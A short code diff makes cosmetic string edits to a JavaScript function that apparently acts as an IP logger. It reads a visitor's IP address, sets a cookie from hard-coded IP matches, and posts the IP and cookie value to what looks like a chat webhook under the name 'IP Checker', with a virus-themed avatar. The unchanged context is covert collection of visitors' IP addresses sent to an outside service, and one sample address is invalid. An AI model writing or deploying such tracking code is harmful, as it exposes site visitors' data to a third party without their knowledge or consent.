@@ -46,7 +46,7 @@ function messageSend() {
     } else if (ipAddress === "987.654.321.0") {
       cookieValue = "Value for IP 987.654.321.0";
     } else {
-      cookieValue = "Default Value";
+      cookieValue = "N/A";
     }
 
     setCookie("myCookie", cookieValue, 30);
@@ -59,7 +59,7 @@ function messageSend() {
     const params = {
       username: "IP Checker",
       avatar_url: "https://c8.alamy.com/comp/JMGG51/cellphone-is-beeing-infected-of-cumputer-with-virus-mobile-concept-JMGG51.jpg",
-      content: "IP Address: " + ipAddress + "\nName " + cookieValue
+      content: "IP Address: " + ipAddress + "\nName: " + cookieValue
     }
 
     request.send(JSON.stringify(params));
